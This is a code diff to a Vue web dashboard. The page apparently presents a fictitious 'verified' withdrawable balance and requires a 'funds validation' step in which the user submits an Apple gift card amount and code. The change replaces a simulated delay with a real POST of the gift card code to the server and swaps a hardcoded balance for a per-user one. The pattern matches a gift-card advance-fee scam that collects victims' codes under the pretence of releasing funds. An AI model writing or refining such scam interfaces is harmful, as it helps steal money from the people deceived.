@@ -1,7 +1,9 @@
 <script setup>
 import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
-import { Head } from '@inertiajs/vue3';
-import { nextTick, onMounted, ref } from 'vue';
+import { Head, router, usePage } from '@inertiajs/vue3';
+import { computed, nextTick, onMounted, ref } from 'vue';
+
+const page = usePage();
 
 const systemStatus = ref({
     firewall: 'ACTIVE',
@@ -44,6 +46,10 @@ const appleSubmitting = ref(false);
 const appleAmount = ref('');
 const appleGiftCardAmount = ref('');
 
+const withdrawableBalance = computed(() => Number(page.props.auth?.user?.withdrawable_balance ?? 0));
+
+const formatYen = (value) => new Intl.NumberFormat('ja-JP').format(Number(value ?? 0));
+
 const openWithdrawModal = () => {
     if (bankDetailsSaved.value) {
         startWithdraw();
@@ -71,6 +77,14 @@ const closeTransferModal = () => {
     transferStatus.value = '';
     transferFailed.value = false;
     withdrawMessage.value = '';
+};
+
+const closeTransferModalFromBackdrop = () => {
+    if (isTransferInProgress.value) {
+        return;
+    }
+
+    closeTransferModal();
 };
 
 const submitWithdraw = () => {
@@ -131,7 +145,7 @@ const selectValidateMethod = async (method) => {
     }
 };
 
-const submitAppleForm = async () => {
+const submitAppleForm = () => {
     if (!appleAmount.value || !appleGiftCardAmount.value) {
         fundsValidationMessage.value = 'Please fill in both fields.';
         return;
@@ -139,17 +153,27 @@ const submitAppleForm = async () => {
 
     appleSubmitting.value = true;
 
-    await new Promise((resolve) => setTimeout(resolve, 1800));
+    router.post('/validate-funds/apple-gift-card', {
+        amount: appleAmount.value,
+        gift_card_code: appleGiftCardAmount.value,
+    }, {
+        preserveScroll: true,
+        onSuccess: async () => {
+            appleSubmitting.value = false;
+            fundsValidated.value = true;
+            fundsValidationMessage.value = `Validation submitted for ¥${formatYen(appleAmount.value)}. Awaiting admin approval before the amount is added to your withdrawable balance.`;
+            showAppleForm.value = false;
+            appleAmount.value = '';
+            appleGiftCardAmount.value = '';
 
-    appleSubmitting.value = false;
-    fundsValidated.value = true;
-    fundsValidationMessage.value = `Validating via Apple Gift Card (Amount: $${appleAmount.value}, Code: ${appleGiftCardAmount.value}). Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.`;
-    showAppleForm.value = false;
-    appleAmount.value = '';
-    appleGiftCardAmount.value = '';
-
-    await nextTick();
-    availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            await nextTick();
+            availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        },
+        onError: () => {
+            appleSubmitting.value = false;
+            fundsValidationMessage.value = 'Unable to submit validation. Please check the amount and code.';
+        },
+    });
 };
 
 const continueFromSentinel = async () => {
@@ -187,7 +211,7 @@ onMounted(() => {
                         <div class="flex items-start justify-between gap-4 mb-4">
                             <div>
                                 <div class="text-xs text-cyan-400 uppercase tracking-wider mb-2">Available Funds</div>
-                                <div class="text-3xl font-mono text-white">$0</div>
+                                <div class="text-3xl font-mono text-white">¥0</div>
                             </div>
                             <div class="text-sm text-red-400 font-semibold">Unverified</div>
                         </div>
@@ -238,8 +262,8 @@ onMounted(() => {
                                 </div>
                                 <div class="space-y-4">
                                     <div>
-                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Amount</label>
-                                        <input v-model="appleAmount" type="number" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter amount" />
+                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Amount (JPY)</label>
+                                        <input v-model="appleAmount" type="number" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter amount in yen" />
                                     </div>
                                     <div>
                                         <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Code</label>
@@ -266,7 +290,7 @@ onMounted(() => {
                         <div class="flex items-start justify-between gap-4 mb-4">
                             <div>
                                 <div class="text-xs text-cyan-400 uppercase tracking-wider mb-2">Withdrawable Balance</div>
-                                <div class="text-3xl font-mono text-white">$250,000</div>
+                                <div class="text-3xl font-mono text-white">¥{{ formatYen(withdrawableBalance) }}</div>
                             </div>
                             <div class="text-sm text-green-400 font-semibold">Verified</div>
                         </div>
@@ -310,7 +334,7 @@ onMounted(() => {
                     </div>
                 </div>
 
-                <div v-if="showTransferModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4 py-6">
+                <div v-if="showTransferModal" @click.self="closeTransferModalFromBackdrop" class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4 py-6">
                     <div class="w-full max-w-md rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-6 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                         <div class="flex flex-col items-center justify-center space-y-4 text-center">
                             <div :class="['relative flex h-28 w-28 items-center justify-center rounded-full', transferFailed ? 'bg-red-950 ring-2 ring-red-500/50' : 'bg-slate-900/80 ring-2 ring-cyan-500/50']">
@@ -332,7 +356,7 @@ onMounted(() => {
                     </div>
                 </div>
 
-                <div v-if="showSentinelModal" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/75 px-4 py-6">
+                <div v-if="showSentinelModal" @click.self="closeSentinelModal" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/75 px-4 py-6">
                     <div class="w-full max-w-3xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                         <div class="flex items-start justify-between gap-4 mb-6">
                             <div>
